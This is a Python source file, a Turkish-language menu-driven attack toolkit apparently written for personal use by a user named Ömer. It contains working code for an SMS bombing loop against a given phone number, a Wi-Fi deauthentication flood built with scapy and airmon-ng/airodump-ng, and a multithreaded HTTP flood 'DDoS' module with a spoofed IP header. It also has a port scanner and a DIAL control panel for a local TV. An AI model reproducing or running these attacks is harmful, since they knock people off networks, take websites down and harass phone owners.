from colorama import Fore, Style, init
from time import sleep
from os import system
import socket
import threading
import subprocess
import os
import csv
import signal
import re
import requests # TV Kontrolü için gerekli
from scapy.all import * # Deauth için gerekli

# SMS modülünü import ediyoruz (Dosyanın yanında sms.py olmalı)
try:
    from sms import SendSms
except ImportError:
    SendSms = None

init(autoreset=True)

# Servisleri hazırla
servisler_sms = []
if SendSms:
    for attribute in dir(SendSms):
        attribute_value = getattr(SendSms, attribute)
        if callable(attribute_value) and not attribute.startswith('__'):
            servisler_sms.append(attribute)

def banner():
    system("cls||clear")
    print(f"""{Fore.LIGHTCYAN_EX}
    ██████╗ ███╗  ███╗███████╗██████╗ 
    ██╔══██╗████╗ ████║██╔════╝██╔══██╗
    ██║  ██║██╔████╔██║█████╗  ██████╔╝
    ██║  ██║██║╚██╔╝██║██╔══╝  ██╔══██╗
    ██████╔╝██║ ╚═╝ ██║███████╗██║  ██║
    ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
                                        
    {Fore.LIGHTYELLOW_EX}>> Yapımcı: Ömer
    {Fore.LIGHTGREEN_EX}>> Aktif SMS Servis: {len(servisler_sms)}
    {Fore.LIGHTWHITE_EX}---------------------------------------
    """)

# --- TV KONTROL MODÜLÜ ---

def tv_control_module():
    banner()
    tv_ip = "192.168.1.37" # Senin Arçelik TV IP
    base_url = f"http://{tv_ip}:8008/apps/"
    
    apps = [
        "YouTube", 
        "YouTubeLeanback", 
        "Netflix", 
        "ChromeCast", 
        "com.google.android.youtube.tv",
        "com.google.android.apps.mediashell",
        "com.arcelik.smarttv"
    ]
    
    print(f"{Fore.LIGHTCYAN_EX}=== Arçelik TV Kontrol Paneli (DIAL) ===")
    print(f"{Fore.LIGHTWHITE_EX}Hedef TV: {tv_ip}\n")
    
    for idx, app in enumerate(apps, 1):
        print(f"{Fore.LIGHTMAGENTA_EX} [{idx}] {app}")
    print(f"{Fore.LIGHTYELLOW_EX} [M] Manuel Uygulama Adı Gir")
    print(f"{Fore.LIGHTWHITE_EX} [0] Geri Dön")
    
    secim = input(f"\n{Fore.LIGHTYELLOW_EX}Seçimin nedir Ömer?: ").upper()
    
    if secim == '0': return
    
    target_app = ""
    if secim == 'M':
        target_app = input(f"{Fore.LIGHTWHITE_EX}Uygulama Adı: ")
    else:
        try:
            target_app = apps[int(secim)-1]
        except:
            print(f"{Fore.LIGHTRED_EX}[!] Geçersiz seçim!"); sleep(1); return

    payload = None
    if "YouTube" in target_app:
        v_id = input(f"{Fore.LIGHTYELLOW_EX}Video ID (Boşsa Ana Sayfa): {Fore.LIGHTWHITE_EX}")
        if v_id: payload = f"v={v_id}"
    
    url = f"{base_url}{target_app}"
    print(f"{Fore.LIGHTCYAN_EX}[*] İstek gönderiliyor...")
    
    try:
        requests.delete(url, timeout=2) # Eski oturumu temizle
        r = requests.post(url, data=payload, timeout=5)
        if r.status_code in [200, 201, 204]:
            print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! TV tepki verdi.")
        else:
            print(f"{Fore.LIGHTRED_EX}[-] Başarısız! Kod: {r.status_code}")
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[!] Bağlantı hatası: {e}")
    
    sleep(2)

# --- MODÜLLER ---

def port_scanner():
    banner()
    target = input(f"{Fore.LIGHTYELLOW_EX}Hedef Site/IP: {Fore.LIGHTWHITE_EX}").strip().replace("http://", "").replace("https://", "")
    try:
        target_ip = socket.gethostbyname(target)
        print(f"\n{Fore.LIGHTGREEN_EX}[+] Hedef IP: {target_ip}")
    except:
        print(f"{Fore.LIGHTRED_EX}[!] Site çözülemedi!"); sleep(2); return

    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 3389, 8080]
    print(f"{Fore.LIGHTCYAN_EX}[*] Tarama başladı, Ömer...\n")
    
    for port in common_ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target_ip, port))
        if result == 0:
            print(f"{Fore.LIGHTGREEN_EX} [!] PORT AÇIK: {port}")
        s.close()
    input(f"\n{Fore.LIGHTYELLOW_EX}Geri dönmek için Enter...")

def deauth_attack():
    banner()
    try:
        ifaces = re.findall(r"^(\w+)\s+", subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT).decode(), re.MULTILINE)
        print(f"{Fore.LIGHTGREEN_EX}Mevcut Kartlar: {ifaces}")
    except: pass

    iface_user = input(f"{Fore.LIGHTYELLOW_EX}Kart İsmi (örn: wlan0): {Fore.LIGHTWHITE_EX}").strip()
    
    iface = iface_user
    if not iface_user.endswith("mon"):
        print(f"{Fore.LIGHTCYAN_EX}[*] Monitör mod açılıyor, Ömer...")
        subprocess.call(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        subprocess.call(["sudo", "airmon-ng", "start", iface_user], stdout=subprocess.DEVNULL)
        try:
            new_ifaces = re.findall(r"^(\w+)\s+", subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT).decode(), re.MULTILINE)
            for i in new_ifaces:
                if i.startswith(iface_user) and i.endswith("mon"):
                    iface = i
                    break
        except: pass

    print(f"\n{Fore.LIGHTCYAN_EX}[*] 15 saniye çevre taranıyor Ömer, bekle...")
    tmp_file = "omer_scan"
    proc = subprocess.Popen(["sudo", "airodump-ng", "--write", tmp_file, "--output-format", "csv", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    try: sleep(15)
    except KeyboardInterrupt: pass
    
    os.kill(proc.pid, signal.SIGTERM)
    subprocess.call(["sudo", "pkill", "airodump-ng"])

    networks = []
    if os.path.exists(tmp_file + "-01.csv"):
        with open(tmp_file + "-01.csv", "r") as f:
            reader = csv.reader(f)
            for row in reader:
                if len(row) > 13 and ":" in row[0] and row[0] != "BSSID":
                    networks.append({"bssid": row[0].strip(), "ch": row[3].strip(), "essid": row[13].strip()})
        for f_del in os.listdir("."):
            if tmp_file in f_del: os.remove(f_del)

    if not networks:
        print(f"{Fore.LIGHTRED_EX}[!] Ağ bulunamadı!"); sleep(2); return

    banner()
    print(f"{'ID':<4} {'BSSID':<20} {'CH':<4} {'AĞ ADI'}")
    print("-" * 55)
    for i, net in enumerate(networks):
        print(f"{i:<4} {net['bssid']:<20} {net['ch']:<4} {net['essid']}")

    try:
        secim = int(input(f"\n{Fore.LIGHTYELLOW_EX}Saldırmak istediğin ID: "))
        target = networks[secim]
    except: return

    subprocess.call(["sudo", "iwconfig", iface, "channel", target['ch']])
    print(f"\n{Fore.LIGHTRED_EX}[!!!] PAKETLER FIRLATILIYOR. DURDURMAK İÇİN CTRL+C ÖMER!")
    pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target['bssid'], addr3=target['bssid'])/Dot11Deauth(reason=7)
    
    try:
        while True:
            sendp(pkt, iface=iface, count=100, inter=0.1, verbose=False)
    except KeyboardInterrupt:
        print(f"\n{Fore.LIGHTYELLOW_EX}Saldırı durduruldu.")
        sleep(2)

# --- DDOS MODÜLÜ ---

ddos_request_count = 0

def ddos_attack_logic(target, port, fake_ip):
    global ddos_request_count
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            request = f"GET / HTTP/1.1\r\nHost: {target}\r\nReal-IP: {fake_ip}\r\n\r\n".encode('ascii')
            s.send(request)
            ddos_request_count += 1
            if ddos_request_count % 100 == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] Saldırı Devam Ediyor... Gönderilen İstek: {ddos_request_count}")
            s.close()
        except:
            sleep(0.1)

def ddos_module():
    banner()
    print(f"{Fore.LIGHTCYAN_EX}=== DDoS (HTTP Flood) Modülü ===")
    target = input(f"{Fore.LIGHTYELLOW_EX}Hedef IP veya Site: {Fore.LIGHTWHITE_EX}").replace("http://", "").replace("https://", "")
    port = int(input(f"{Fore.LIGHTYELLOW_EX}Port (80/443): {Fore.LIGHTWHITE_EX}"))
    thread_count = int(input(f"{Fore.LIGHTYELLOW_EX}Thread Sayısı: {Fore.LIGHTWHITE_EX}"))
    fake_ip = '182.21.20.32'
    
    print(f"\n{Fore.LIGHTRED_EX}[!] {thread_count} thread ile saldırı başlıyor Ömer! Durdurmak için CTRL+C")
    for i in range(thread_count):
        thread = threading.Thread(target=ddos_attack_logic, args=(target, port, fake_ip))
        thread.daemon = True
        thread.start()
    
    try:
        while True: sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.LIGHTYELLOW_EX}DDoS durduruldu.")
        sleep(2)

# --- ANA DÖNGÜ ---

while True:
    banner()
    try:
        print(f"{Fore.LIGHTMAGENTA_EX} [1] SMS Gönder (Normal)")
        print(f"{Fore.LIGHTMAGENTA_EX} [2] SMS Gönder {Fore.LIGHTRED_EX}(TURBO)")
        print(f"{Fore.LIGHTCYAN_EX} [3] Port Scanner (Hızlı Keşif)")
        print(f"{Fore.LIGHTRED_EX} [4] Deauth Attack (Ağdan Düşür)")
        print(f"{Fore.LIGHTRED_EX} [5] DDoS Attack (HTTP Flood)")
        print(f"{Fore.LIGHTBLUE_EX} [6] Arçelik TV Kontrol Paneli")
        print(f"{Fore.LIGHTWHITE_EX} [7] Çıkış Yap\n")
        
        secim = input(f"{Fore.LIGHTYELLOW_EX} Ömer, ne yapmak istersin?: {Fore.LIGHTWHITE_EX}")
        if secim == "": continue
        secim = int(secim)
    except ValueError:
        print(f"\n{Fore.LIGHTRED_EX}[!] Rakam gir Ömer!")
        sleep(2); continue

    if secim == 1 or secim == 2:
        if not SendSms:
            print(f"{Fore.LIGHTRED_EX}[!] sms.py dosyası bulunamadı!"); sleep(2); continue
        tel_no = input(f"{Fore.LIGHTYELLOW_EX}Telefon No (0 olmadan): {Fore.LIGHTWHITE_EX}")
        try:
            adet = int(input(f"{Fore.LIGHTYELLOW_EX}Kaç SMS gönderilsin (Başarılı olana kadar döner)?: {Fore.LIGHTWHITE_EX}"))
        except: adet = 1
        sms = SendSms(tel_no, "")
        gonderilen = 0
        try:
            while gonderilen < adet:
                for servis in servisler_sms:
                    if gonderilen >= adet: break
                    getattr(sms, servis)()
                    gonderilen += 1
                    print(f"{Fore.LIGHTCYAN_EX}[+] {gonderilen}. SMS Gönderildi | Servis: {servis}")
                    if secim == 1: sleep(1.5)
        except KeyboardInterrupt:
            print(f"\n{Fore.LIGHTYELLOW_EX}Durduruldu.")
        sleep(2)

    elif secim == 3:
        port_scanner()

    elif secim == 4:
        deauth_attack()

    elif secim == 5:
        ddos_module()

    elif secim == 6:
        tv_control_module()

    elif secim == 7:
        print(f"\n{Fore.LIGHTCYAN_EX}Görüşürüz Ömer!")
        break
